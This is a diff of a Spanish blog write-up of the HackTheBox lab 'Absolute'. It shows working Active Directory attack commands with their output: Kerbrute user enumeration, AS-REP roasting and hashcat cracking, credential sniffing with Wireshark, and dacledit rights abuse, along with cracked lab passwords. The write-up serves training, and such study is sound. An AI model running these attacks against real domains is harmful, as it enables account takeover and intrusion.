@@ -11,8 +11,8 @@ tags:
 math: false
 mermaid: true
 image:
-  path: 
-  lqip: 
+  path: /assets/img/post/Absolute/Absolute.png 
+  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA 
   alt: Absolute
 ---
 
@@ -96,17 +96,20 @@ Host script results:
 ```
 {: .nolineno }
 
-## Enumeración de servicios
+## Recon
 
 A primera vista, podemos observar que los puertos (53, 88, 389) correspondientes a DNS, Kerberos y LDAP están abiertos, lo cual ya es un indicador claro de que nos encontramos frente a un controlador de dominio.
 
 ### Web 80 - TCP
 
-Para ir directo al grano: no tenemos acceso a una sesión de invitado para enumerar recursos a través de SMB, ni podemos conectarnos al Controlador de Dominio (DC) mediante rpcclient o LDAP para enumerar usuarios o información del dominio. En cuanto al servidor web, se trata de un IIS que almacena una página estática. Después de ejecutar Gobuster, no he encontrado nada de interés, como archivos PHP o ASPX. Sin embargo, podemos obtener información de las imágenes almacenadas en la carpeta '/images'. Descargaremos estas imágenes a nuestra máquina local para analizar posteriormente los metadatos.
+Para ir directo al grano, no tenemos acceso a una sesión de invitado para enumerar recursos a través de SMB, no podemos conectarnos al DC mediante rpcclient, no podemos realizar querys por LDAP para enumerar usuarios o información del dominio, ni tampoco enumerar subdominios a través de ataques AXFR. En cuanto al servidor web, se trata de un IIS que almacena una página estática. Después de ejecutar Gobuster, no he encontrado nada de interés, como archivos PHP o ASPX. Sin embargo, podemos obtener información de las imágenes almacenadas en la carpeta '/images'. Descargaremos estas imágenes a nuestra máquina local para analizar posteriormente los metadatos.
 
 ```bash
 wget -r http://absolute.htb/images
 ```
+{: .nolineno }
+
+#### ExifTool: Extrayendo metadatos
 
 Para analizar los metadatos de las imágenes, utilizaré ExifTool y filtraré por el campo 'Author' con el fin de obtener, si está disponible, el nombre de usuario que creó la imagen. En este caso, utilizaré un `*` para que el comando se aplique a todos los archivos PNG y me lo redirija a un fichero de texto. El comando que emplearé es el siguiente:
 
@@ -119,6 +122,7 @@ Sarah Osvald
 Jeffer Robinson
 Nicole Smith
 ```
+{: .nolineno }
 
 Ahora que tenemos una lista de posibles usuarios, hemos dado un paso valioso en un entorno de Active Directory (AD). Generalmente, la estructura de los nombres de usuario depende del dominio y suele seguir patrones como inicial, apellido, inicial.apellido, inicial_apellido, entre otros. Para simplificar la generación de posibles nombres de usuario, existe una herramienta escrita en Ruby llamada **Username-Anarchy**. Esta herramienta toma un archivo de texto correctamente formateado y genera una lista de posibles nombres de usuario. Puedes encontrarla en el siguiente repositorio: [Usename-Anarchy](https://github.com/urbanadventurer/username-anarchy).
 
@@ -127,7 +131,7 @@ El siguiente paso consiste en formatear el archivo de manera que **Username-Anar
 ```
 :%s/ /,/g
 ```
-
+{: .nolineno }
 El fichero final es el siguiente:
 
 ```bash
@@ -140,7 +144,7 @@ Donald,Klay
 Jeffer,Robinson
 Sarah,Osvald
 ```
-
+{: .nolineno }
 Ejecutamos **Username-Anarchy** y obtenemos un archivo de texto con los posibles nombres de usuario. Luego, utilizamos **sponge** para sobrescribir el archivo sin la necesidad de redirigirlo a uno temporal o realizar pasos adicionales
 
 ```bash
@@ -159,6 +163,9 @@ jrobinson
 s.osvald
 sosvald
 ```
+{: .nolineno }
+
+### User Enumeration: Kerbrute
 
 En Active Directory, el primer paso comúnmente realizado cuando se dispone de una lista de posibles usuarios del dominio es utilizar **Kerbrute** para comprobar si son válidos o no. Esto se  puede comprobar debido al funcionamiento de Kerberos. Cuando se envía una solicitud `AS_REQ` para obtener un TGT (Ticket Granting Ticket), si el usuario no es válido, Kerberos responde con un mensaje de `PRINCIPAL_UNKNOWN`, indicando que el usuario no se encuentra en la base de datos de Kerberos. Por otro lado, si el usuario es válido, Kerberos responderá con un mensaje de 'invalid credentials' u otra respuesta similar. 
 
@@ -187,11 +194,11 @@ $krb5asrep$18$d.klay@ABSOLUTE.HTB:fc3b115409207e3dc0d7b4e5bcecb3e0$021ba373ad154
 2023/11/05 13:40:41 >  Done! Tested 24 usernames (6 valid) in 0.214 seconds
 ```
 
-Tras ejecutar Kerbrute, observamos un listado de usuarios válidos, y notamos que `d.klay` es vulnerable al ataque `AS-REP roast`. La última versión de Kerbrute realiza un AS-REP roast directamente para obtener el Ticket Granting Ticket (TGT) del usuario vulnerable. La vulnerabilidad de este usuario radica en su configuración, que tiene la opción `DONT_REQUIRE_PREAUTH` habilitada. Esto significa que no requiere autenticación previa de Kerberos, lo que permite que el `kdc` devuelva el TGT con la contraseña del usuario encriptada
+Tras ejecutar Kerbrute, observamos un listado de usuarios válidos, y notamos que `d.klay` es vulnerable al ataque `AS-REP roast`. La última versión de Kerbrute realiza un AS-REP roast directamente para obtener el Ticket Granting Ticket (TGT) del usuario vulnerable. La vulnerabilidad de este usuario radica en su configuración, que tiene la opción `DONT_REQUIRE_PREAUTH` habilitada. Esto significa que no requiere autenticación previa de Kerberos, lo que permite que el `kdc` devuelva el TGT con la contraseña del usuario encriptada.
 
 Guardamos los usuarios válidos en un fichero.
 
-```
+```bash
 ❯ cat usernames.txt
 m.chaffrey
 j.roberts
@@ -200,10 +207,12 @@ j.robinson
 s.osvald
 d.klay
 ```
+{: .nolineno }
+### AS-REP Roast Attack
 
-El hash capturado por Kerbrute no se puede crackear,  ya que se está utilizando una versión de kerberos 
+Por defecto, el valor ETYPE que Kerbrute muestra en su salida es el 18, mientras que el modo utilizado para crackear los hashes en Hashcat es el ETYPE 23. Debido a esta diferencia de formato, no será posible crackear el hash, ya que no coincide con el formato requerido por Hashcat. Para obtener el hash en un formato que hashcat entienda podemos hacer lo siguiente
 
-Para obtener el hash, la mejor opción es `impacket-GetNPUUsers`
+Usar `impacket-GetNPUsers`:
 
 ```bash
 ❯ impacket-GetNPUsers -dc-ip 10.129.68.75 -no-pass -request 'absolute.htb/d.klay'
@@ -212,8 +221,8 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*] Getting TGT for d.klay
 $krb5asrep$23$d.klay@ABSOLUTE.HTB:7f20e46062a600c2be20601c64f7a964$01cc50aef8801b01616870c0a0a5e5aff9a3c47b6173af9d62c96a81d352da28c74871a959c5e4b8ab7b055cfb991a3d67f70895c676fc47ec668f6aa0850ca3ca81d62c8d6e27e3fcb19e1716106fa012b31c755bd912f71160b1f12e257035577ac26caf476ee9c9734209e3f43b1303b25814f63caf1c2ab4e6d3f4316bafd1589d03b91625834987f71cc669872d66aaf06bb568ec5e1ca960cccca9199a43c8dca79cca058f38cc93c76e0123d9f59abd5158f018e8edd2253f73d657f5e5e2f2f7498d0840e8dc9775826e9f5b3d3652f227b7719ac0c2f5b456e7e4ab52cfb135b65f7fc7265ae845
 ```
-
-Con kerbrute (--downgrade):
+{: .nolineno }
+Con kerbrute usar la flag `--downgrade`:
 
 ```
 ❯ /opt/kerbrute/kerbrute userenum --dc dc.absolute.htb -d absolute.htb users.txt --downgrade
@@ -251,7 +260,7 @@ OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 1
 * Device #1: cpu-haswell-Intel(R) Core(TM) i7-5775C CPU @ 3.30GHz, 6921/13906 MB (2048 MB allocatable), 8MCU
 
 ```
-
+{: .nolineno }
 ```bash
 $krb5asrep$23$d.klay@ABSOLUTE.HTB:7dcc8ee944cbd8d9acffd5e52e051762$6f4acb9b53597e032fa24da7f8c4ac8c4f66e92394b5512c9702841ac64f134052687e40aa5beb40a7977ecd1b0b91e1b90fbfef6ede949050627e5d43ff2a4a4c1ee7f4cee2df7c3534c4a4fb674a5863f170414049ac2b2d95e4cda2679bfab591c205f1b6f3a942432e4d74f68350cb6300cf90309c1ca714e1ec0520b2058ac5199b5056a8319869eab3aedc35688b1cd3911dc0e2c071fe6e1da57040497021ddd2e2bdaec6544bedf696dd2eb0d7df0b5f1bf3a90846939dfc93322c58fd42b6c05303436f81c870b7847481c033112905c1f6d316c78cd439fb52f10d9381e1c8c0804c2e4be542c8:Darkmoonsky248girl
 ```
@@ -263,7 +272,7 @@ Tras conseguir obtener la contraseña del usuario `d.klay` en texto plano, voy a
 SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
 SMB         10.129.68.75    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
 ```
-
+{: .nolineno }
 Parece ser que `crackmapexec` realiza la autenticación mediante `NTLM`. Puede que el administrador del dominio haya deshabilitado este tipo de autenticación para usuarios no privilegiados, ya que de esta manera se evitan los ataques `Pass-The-Hash`.
 
 Pero al disponer de la contraseña, voy a autenticarme usando `Kerberos`.
@@ -273,9 +282,9 @@ Pero al disponer de la contraseña, voy a autenticarme usando `Kerberos`.
 SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
 SMB         10.129.68.75    445    DC               [-] absolute.htb\d.klay: KRB_AP_ERR_SKEW
 ```
-
+{: .nolineno }
 Vemos el siguiente error `KRB_AP_ERR_SKEW`. Esto ocurre porque no tenemos sincronizados la hora de nuestra máquina de atacante con el reloj del DC. Para evitar problemas con Kerberos siempre es recomendable tener síncronizada la hora.
-#### Sincronizando el reloj con el DC.
+### Sincronizando el reloj con el DC.
 
 Para sincronizarlo podemos usar la herramienta `ntpdate`, aunque en mi caso tuve que realizar una configuración extra:
 
@@ -284,7 +293,7 @@ Para sincronizarlo podemos usar la herramienta `ntpdate`, aunque en mi caso tuve
 2023-11-05 22:19:23.24649 (+0100) +25200.798573 +/- 0.025121 10.129.68.75 s1 no-leap
 CLOCK: time stepped by 25200.798573
 ```
-
+{: .nolineno }
 Aunque ejecute este comando, el reloj no se síncroniza y esto en mi caso concreto se debía a que el demonio `systemd-timesyncd` estaba ejecutandose. Este demonio se utiliza para sincronizar el reloj del sistema a través de la red, lo cual causaba conficto con`ntpdate`. Para evitar errores simplemente deshabilito el servicio, y ya puedo sincronizarme al DC.
 
 ```bash
@@ -297,7 +306,7 @@ Password:
 ❯ sudo ntpdate dc.absolute.htb
 2023-11-05 22:28:00.484487 (+0100) +252
 ```
-
+{: .nolineno }
 Nos autenticamos por Kerberos, y ahora podemos comprobar que las credenciales son correctas.
 
 ```bash
@@ -305,14 +314,14 @@ Nos autenticamos por Kerberos, y ahora podemos comprobar que las credenciales so
 SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
 SMB         10.129.68.75    445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
 ```
-
-#### Configurando Kerberos para autenticación.
+{: .nolineno }
+### Usando Kerberos como método de autenticación
 
 Bien ya que disponemos de credenciales válidas, si queremos autenticarnos en el dominio para empezar a enumerar, lo tenemos que hacer usando Kerberos obligatoriamente. Esto puede ser un dolor de cabeza al principio por que la mayoría de scripts usados para enumerar AD, usan `NTLM` por defecto. 
 
 Por ejemplo voy a conectarme por `rpcclient` al DC, usando las credenciales de `d.klay`
 
-```
+```bash
 ❯ rpcclient -U 'absolute.htb\d.klay%Darkmoonsky248girl' 10.129.68.75
 Cannot connect to server.  Error was NT_STATUS_ACCOUNT_RESTRICTION
 ```
@@ -324,16 +333,14 @@ El siguiente mensaje indica que la autenticación NTLM está desactivada. En cam
 Kerberos auth with 'd.klay@ABSOLUTE.HTB' (ABSOLUTE.HTB\d.klay) to access '10.129.68.75' not possible
 Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
 ```
-
+{: .nolineno }
 No podemos conectarnos pero simplemente porque no tenemos permisos xD
 
 Ahora bien ¿Como utilizo Kerberos, como método de autenticación?
 
-Para llevar a cabo esta tarea, es necesario contar con el paquete `krb5-user` instalado y configurar el fichero `/etc/krb5.conf` indicado la información del dominio al que nos vamos a conectar. Debe tener la siguiente estructura:
+Pues es necesario contar con el paquete `krb5-user` instalado y configurar el fichero `/etc/krb5.conf` indicado la información del dominio al que nos vamos a conectar. Debe tener la siguiente estructura:
 
 ```bash
-❯ cat /etc/krb5.conf
-
 [libdefaults]
     default_realm = ABSOLUTE.HTB
 
@@ -353,11 +360,11 @@ Para llevar a cabo esta tarea, es necesario contar con el paquete `krb5-user` in
 
 Una vez esto vamos a iniciar sesión como `d.klay` usando el comando `kinit`
 
-```
+```bash
 ❯ kinit d.klay
 Password for d.klay@ABSOLUTE.HTB:
 ```
-
+{: .nolineno }
 No vemos ningún output lo cual quiere decir que disponemos de una sesión como `d.klay`. Podemos listar los tickets almacenados en memoria con `klist`
 
 ```bash
@@ -371,13 +378,18 @@ Valid starting     Expires            Service principal
 11/07/23 02:51:18  11/07/23 06:50:44  ldap/dc.absolute.htb@ABSOLUTE.HTB
 	renew until 11/07/23 06:50:44
 ```
+{: .nolineno }
+Bien ahora que podemos usar Kerberos como método de autenticación vamos a enumerar el dominio autenticados.
 
-Bien ahora que podemos usar Kerberos como método de autenticación vamos a enumerar el dominio.
-#### Enumeración autenticado: LDAPsearch
+> También puedes usar **impacket** junto con el script **getTGT**. Este script crea un archivo **.ccache** que contiene el ticket de autenticación del usuario. Para utilizar esas credenciales, debes cambiar una variable de entorno llamada **KRB5CCNAME** para que apunte a ese archivo y, a partir de ahí, puedes autenticarte en el dominio. Para mí esta opción es un poco coñazo, ya que si cambias de pestaña en la terminal o se te olvida exportar la variable de entorno, perderás la autenticación. 
+{: .prompt-info }
 
-Si queremos realizar una query de algo en especial y no queremos tirar el `bloodhound`, siempre es buena opción tirar de `ldapdomaindump` o `ldapsearh`. En este caso creo que `ldapdomaindump` no dispone de soporte para autenticarse usando kerberos, pero con `ldapsearch` si podemos.
-Al disponer del ticket almacenado en memoria no hace falta que proporcionemos contraseña, cada vez que realicemos una query por LDAP, se usará ese ticket.
-Por ejemplo de esta manera podemos enumerar todos los usuarios del dominio
+## Enumeración del dominio
+
+Para mí la mejor opción para enumerar el dominio, es con `bloodhound`. Se puede ir haciendo manualmente con herramietas como `PowerView`, `ldapsearh`, `rpcclient`, etc... Pero a fin de cuentas la manera en la que `Bloodhound`, representa la información me parece más clara y la que mejor refleja la vía para escalar privilegios dentro del dominio. Dicho esto si queremos saber una información concreta, como por ejemplo a que grupo pertenece un usuario o enumerar los recursos compartidos por SMB, pues sí que es más rentable usar estas herramientas. Por ejemplo en este caso uso `ldapsearch` para sacar los usuarios del dominio. 
+
+>Para usar la autenticación por que kerberos con **ldapseach** debemos tener instalado el paquete **libsasl2-modules-gssapi-mit** e indicar la flag **-Y GSSAPI** 
+{: .prompt-warning }
 
 ```bash
 ❯ ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "DC=absolute,DC=htb" "objectclass=user" | grep "name" | awk '{print $2}'
@@ -404,7 +416,7 @@ svc_smb
 svc_audit
 winrm_user
 ```
-
+{: .nolineno }
 También podríamos enumerar sus descripciones, ya que es común que en entornos CTF, se pueda obtener información como contraseñas.
 
 ```bash
@@ -438,12 +450,64 @@ name: svc_audit
 description: Used to perform simple network tasks
 name: winrm_user
 ```
-
+{: .nolineno }
 Como se puede observar en la descripcción de un usuario se puede ver la string `AbsoluteSMBService123!`, que tiene todas las papeletas de ser una contraseña.
-Enumerar con `ldapsearch` es incomodo para mi gusto y más disponiendo de herramientas como `bloodhound`, pero es interesante ver como se puede enumerar la misma información de maneras diferentes.
-#### Enumeración autenticado: Bloodhound
 
-Después de enumerrar
+Con `crackmapexec` es más sencillo tambíen lo podemos hacer y es mas legible la información:
+
+```bash
+❯ cme ldap 10.129.229.59 -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --users
+SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+LDAP        10.129.229.59   389    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022! 
+LDAP        10.129.229.59   389    DC               [*] Total of records returned 20
+LDAP        10.129.229.59   389    DC               Administrator                  Built-in account for administering the computer/domain
+LDAP        10.129.229.59   389    DC               Guest                          Built-in account for guest access to the computer/domain
+LDAP        10.129.229.59   389    DC               krbtgt                         Key Distribution Center Service Account
+LDAP        10.129.229.59   389    DC               J.Roberts                      
+LDAP        10.129.229.59   389    DC               M.Chaffrey                     
+LDAP        10.129.229.59   389    DC               D.Klay                         
+LDAP        10.129.229.59   389    DC               s.osvald                       
+LDAP        10.129.229.59   389    DC               j.robinson                     
+LDAP        10.129.229.59   389    DC               n.smith                        
+LDAP        10.129.229.59   389    DC               m.lovegod                      
+LDAP        10.129.229.59   389    DC               l.moore                        
+LDAP        10.129.229.59   389    DC               c.colt                         
+LDAP        10.129.229.59   389    DC               s.johnson                      
+LDAP        10.129.229.59   389    DC               d.lemm                         
+LDAP        10.129.229.59   389    DC               svc_smb                        AbsoluteSMBService123!
+LDAP        10.129.229.59   389    DC               svc_audit                      
+LDAP        10.129.229.59   389    DC               winrm_user                     Used to perform simple network tasks
+```
+{: .nolineno }
+
+A mí una herramienta que me gusta mucho para un reconocimiento inicial es `ldapdomaindump`, pero no soporta la autenticación por Kerberos así que este caso no aplica. 
+
+También podríamos enumerar los recursos compartidos a los que tenemos permisos de escritura/lectura con `crackmapexec`
+
+```bash
+❯ cme smb 10.129.229.59 -u 'd.klay' -p 'Darkmoonsky248girl' -k  --shares
+SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+SMB         10.129.229.59   445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
+SMB         10.129.229.59   445    DC               [+] Enumerated shares
+SMB         10.129.229.59   445    DC               Share           Permissions     Remark
+SMB         10.129.229.59   445    DC               -----           -----------     ------
+SMB         10.129.229.59   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.229.59   445    DC               C$                              Default share
+SMB         10.129.229.59   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.229.59   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.229.59   445    DC               Shared                          
+SMB         10.129.229.59   445    DC               SYSVOL          READ            Logon server share 
+
+```
+
+Vemos una carpeta llamada `Shared` , que de momento no podemos acceder, pero sería interesante apuntar para mirar más tarde.
+#### Bloodhound
+
+Blodhound es una herramienta que se usa para auditar Active Directory. Utiliza gráficos para mostrar cómo están relacionados los objetos dentro del dominio. Esto ayuda a comprender mejor el dominio y a planear posibles vectores de ataque para elevar privilegios o moverse lateralmente dentro del dominio.
+
+Normalmente se suele disponer de una shell en el sistema, y se lanzan los 'injestors' `SharpHound.exe` o `SharpHound.ps1`, para recopilar toda la información a través de consultasa LDAP en un fichero zip. Esto puede ser algo pesado de hacer ya que tienes que tener obligatoriamente una shell en alguno de los equipos del dominio y lo más probable es que tengas que evadir algún antivirus. En este caso en particular no queda otra que tirar `bloodhound-python` para enumerar el dominio. 
+
+Con el siguiente comando realizaremos todas esas consultas sin necesidad de subir ningún binario. La información recopilada estara comprendida en varios ficheros `json` que tendremos que subir a `bloodhound`.
 
 ```bash
 ❯ bloodhound-python -dc dc.absolute.htb -ns 10.129.68.75 -c all -d absolute.htb -u 'd.klay' -p 'Darkmoonsky248girl'
@@ -464,7 +528,9 @@ INFO: Starting computer enumeration with 10 workers
 INFO: Querying computer: dc.absolute.htb
 INFO: Done in 00M 10S
 ```
+{: .nolineno }
 
+Para iniciar bloodhound es necesario tener instalado `neo4j`, que es un tipo de base de datos que se basa en grafos.
 
 ```
 ❯ sudo neo4j console
@@ -480,26 +546,43 @@ certificates: /usr/share/neo4j/certificates
 licenses:     /usr/share/neo4j/licenses
 run:          /var/lib/neo4j/run
 ```
+{: .nolineno }
+
+Una vez iniciada la base de datos `neo4j`, ejecutamos bloodhound. En mi caso lo tengo a la última versión, y lo ejecuto con un alias., ya que por `apt`, suelen faltarle algunas features.
 
 ```bash
 ❯ which bloodhound
 bloodhound: aliased to /opt/bloodhound/BloodHound --no-sandbox &> /dev/null & disown
 ```
-
+{: .nolineno }
 ```
 ❯ cat ~/.zshrc | grep bloodhound
 alias bloodhound='/opt/bloodhound/BloodHound --no-sandbox &> /dev/null & disown'
 ```
+{: .nolineno }
+
+Subimos los ficheros json para comenzar el analisis.
+
+![img](/assets/img/post/Absolute/21.png)
+
+Tras realizar varias querys, no encuentro nada de utilidad entre ellas estan:
+
+* **Find all Kerberoestable Users**
+* **Shortest paths to Domain Admins**
+* **Shortests paths to Uncronstained Delegation Systems**
+
+Como hemos mencionado antes, en un CTF es común encontrar información sensible, como contraseñas, en las descripciones de los usuarios. En este caso, necesité conectarme a la base de datos Neo4j desde el servidor web y escribir una consulta personalizada para recuperar esta información.
 
 ```
 MATCH (u:User) return u.name, u.description
 ```
-
+{: .nolineno }
 
 ![img](/assets/img/post/Absolute/1.png)
 
+También lo podemos obtener inspeccionando el json perteneciente a la información de los usuarios.
 
-```
+```bash
 ❯ cat 20231105223511_users.json  | jq '.data[].Properties | .samaccountname + ":" + .description' -r
 :
 winrm_user:Used to perform simple network tasks
@@ -520,12 +603,22 @@ krbtgt:Key Distribution Center Service Account
 Administrator:Built-in account for administering the computer/domain
 Guest:Built-in account for guest access to the computer/domain
 ```
+{: .nolineno }
 
+### User Pivoting: smc_smb
 
-## LDAP
+Probamos la contraseña del usuario `svc_smb` y vemos que es válida dentro del dominio.
 
+```bash
+❯ cme smb 10.129.229.59 -u 'svc_smb' -p 'AbsoluteSMBService123!' -k
+SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+SMB         10.129.229.59   445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! 
 
-### WireShark
+```
+
+Anteriormente disponíamos de una carpeta compartida por SMB, a la cual no teníamos acceso, vamos a comprobar si ahora con el nuevo usuario comprometido podemos:
+
+### Enumerando SMB Autenticado
 
 ```bash
 ❯ cme smb 10.129.68.75 -u 'svc_smb' -p 'AbsoluteSMBService123!' -k --shares
@@ -540,13 +633,30 @@ SMB         10.129.68.75    445    DC               IPC$            READ        
 SMB         10.129.68.75    445    DC               NETLOGON        READ            Logon server share 
 SMB         10.129.68.75    445    DC               Shared          READ            
 SMB         10.129.68.75    445    DC               SYSVOL          READ            Logon server share 
+```
+{: .nolineno }
+
+El output de crackmapexec nos indica que disponemos de permisos de lectura para esa carpeta. Para conectarme como el usuario `smb_svc`, voy eliminar el ticket anterior y generar uno nuevo.
 
 ```
+❯ kdestroy
+❯ kinit svc_smb
+Password for svc_smb@ABSOLUTE.HTB: 
+```
+
+No se porque por `smbclient` me daba fallos por todos lados usando kerberos. En estes caso use impacket. Es importante setear la variable de entorno `KRB55CNAME` al ticket anteriormente, ya que impacket por defecto busca el fichero `ccache` para usar Kerberos.
 
 ```bash
-impacket-smbclient 'absolute.htb/svc_smb:AbsoluteSMBService123!@dc.absolute.htb' -k 
+❯ KRB5CCNAME=/tmp/krb5cc_1000 impacket-smbclient 'absolute.htb/svc_smb@dc.absolute.htb' -k
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+Type help for list of commands
+# 
 ```
 
+Dentro del fichero vemos dos ficheros, voy a descargarlos para inspeccionarlos detenidamente.
+{: .nolineno }
 ```
 # use Shared
 # ls
@@ -555,14 +665,84 @@ drw-rw-rw-          0  Thu Sep  1 19:02:23 2022 ..
 -rw-rw-rw-         72  Thu Sep  1 19:02:23 2022 compiler.sh
 -rw-rw-rw-      67584  Thu Sep  1 19:02:23 2022 test.exe
 ```
-
+{: .nolineno }
 ```
 # get test.exe
 # get compiler.sh
 ```
 
+### VPN: Routing
 
-### Spam de mi script
+El fichero `compiler.sh` es un script para compilar un programa `nim`y `test.exe` es un ejecutable de Windows de 64 bits.
+
+```bash
+❯ file *
+compiler.sh: Bourne-Again shell script, ASCII text executable, with CRLF line terminators
+test.exe:    PE32+ executable (GUI) x86-64 (stripped to external PDB), for MS Windows, 11 sections
+```
+{: .nolineno }
+
+Voy a transferir el fichero a mi máquina Windows, para poder trastear más cómodamente.
+
+Como atacante es de esperar que este binario este interactuando con el Domain Controller de alguna manera, pudiendo obtener credenciales en este proceso de comunicación. Lo que esta haciendo realmente es una consulta por LDAP al Domain Controller, y yo quiero capturarla con WireShark, y para esto es necesario tener conectividiad con la máquina víctima desde Windows
+
+**Uso de VPNForwarding.sh**
+
+Después de hacer varias máquinas en las que al final tenía que utilizar Windows y por ende tenía que cambiar la VPN de HTB o ejecutar las mismas reglas iptables una y otra vez, hice un pequeño script que automatizara todo el proceso.
+
+El script es el siguiente  [VPNForwarding.sh](https://raw.githubusercontent.com/ace00k/automation-tools/main/VPNforwarding.sh). Su funcionamiento es sencillo: basta con ejecutarlo con privilegios de root en una máquina Linux y utilizar el comando resultante en la máquina Windows. De esta manera, mi máquina Kali actúa como enrutador, lo que me permite establecer conectividad con la máquina víctima desde mi Windows.
+
+```bash
+❯ sudo /opt/automation-tools/./VPNforwarding.sh
+[sudo] password for alex: 
+
+[+] Interface tun0 exists, skipping
+
+[!] IPv4 forwarding is not enabled! Do you want to enable it? (y/n): y
+
+[*] Enabling IPv4 forwarding
+
+[+] Done!
+
+[!] Are you sure you want to proceed? All currently saved iptables rules will be deleted. (y/n): 
+y
+[+] Iptables rules created, please run the following command on your Windows host:
+
+	route add 10.129.0.0/16 192.168.1.44
+```
+{: .nolineno }
+
+Pegamos el comando en la máquina Windows.
+
+![img](/assets/img/post/Absolute/7.png)
+
+Ahora si que tenemos conectividad con la máquina víctima. Podemos comprobarlo envíando una traza ICMP.
+
+![img](/assets/img/post/Absolute/8.png)
+
+Como nos estamos enfrentando a un controlador de dominio, voy a configurar la IP de Absolute como servidor DNS Esto se puede hacer de la siguiente forma:  (Win + R )  `ncpa.cpl`
+
+![img](/assets/img/post/Absolute/9.png)
+
+Seleccionamos la interfaz Ethernet0 y hacemos click derecho en propiedades.
+
+![img](/assets/img/post/Absolute/11.png)
+
+Nos vamos a `Protocolo de Internet versión 4`
+
+![img](/assets/img/post/Absolute/12.png)
+
+Y ponemos la IP de Absolute como servidor DNS preferido
+
+![img](/assets/img/post/Absolute/13.png)
+
+Si hacemos una petición DNS a `absolute.htb` vemos que nos resuelve correctamente.
+
+![img](/assets/img/post/Absolute/14.png)
+
+#### Wireshark
+
+Cuando utilizamos Wireshark para capturar el tráfico en la interfaz `Ethernet0`, a menudo nos encontramos con una gran cantidad de datos que no son de interés.  Con el siguiente filtro vamos a capturar solamente los paquetes que contienen la dirección IP de Absolute y al mismo tiempo, quitamos las solicitudes DNS. El filtro que he utilizado es el siguiente
 
 ```
 ip.addr == 10.129.68.75 && not udp.port ==53
@@ -571,25 +751,34 @@ ip.addr == 10.129.68.75 && not udp.port ==53
 
 ![img](/assets/img/post/Absolute/2.png)
 
+Vamos a volver a ejecutar `test.exe`
 
 ![img](/assets/img/post/Absolute/3.png)
 
+En WireShark podemos ver el tráfico de red generado, en el que se encuentra las consultas LDAP.
+
 ![img](/assets/img/post/Absolute/4.png)
+
+Si inspeccionamos los paquetes podemos ver las credenciales del usuario `m.lovegood`.
 
 ![img](/assets/img/post/Absolute/5.png)
 
-
 ## Acceso Inicial
 
+El acceso inicial se puede conseguir de dos maneras usando PowerView o desde Linux. Bajo mi punto de vista, es mucho mas sencillo hacerlo desde Windows, y menos calentamientos de cabeza
+
 ### Método 1: Desde Linux
+
+Bien desde aquí podemos hacer dos cosas, usar PowerView o estar con Window
+
 
 ```bash
 ❯ cme smb 10.129.68.75 -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k
 SMB         10.129.68.75    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
 SMB         10.129.68.75    445    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022!
 ```
-
-```
+{: .nolineno }
+```bash
 ❯ git clone https://github.com/ShutdownRepo/impacket -b dacledit
 Cloning into 'impacket'...
 remote: Enumerating objects: 24084, done.
@@ -599,12 +788,12 @@ remote: Total 24084 (delta 5246), reused 5187 (delta 5187), pack-reused 18599
 Receiving objects: 100% (24084/24084), 9.82 MiB | 6.68 MiB/s, done.
 Resolving deltas: 100% (18353/18353), done.
 ```
-
-```
+{: .nolineno }
+```bash
 ❯ python3 -m venv .venv
 ❯ source .venv/bin/activate
 ```
-
+{: .nolineno }
 ```bash
 ❯ pip3 install .
 Processing /home/alex/HTB/Absolute/content/impacket
@@ -614,7 +803,7 @@ Processing /home/alex/HTB/Absolute/content/impacket
 Collecting pyasn1>=0.2.3 (from impacket==0.9.25.dev1+20230823.145202.4518279)
   Downloading pyasn1-0.5.0-py2.py3-none-any.whl (83 kB)
 ```
-
+{: .nolineno }
 
 ```bash
 ❯ KRB5CCNAME=m.lovegod.ccache ./dacledit.py -k -no-pass -dc-ip 10.129.68.75 -principal m.lovegod -target "Network Audit" -action write -rights FullControl absolute.htb/m.lovegod
@@ -623,7 +812,7 @@ Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corpor
 [*] DACL backed up to dacledit-20231106-192332.bak
 [*] DACL modified successfully!
 ```
-
+{: .nolineno }
 
 ```bash
 ❯ KRB5CCNAME=m.lovegod.ccache ./dacledit.py -k -no-pass -dc-ip 10.129.68.75 -principal m.lovegod -target "Network Audit" -action write -rights FullControl absolute.htb/m.lovegod
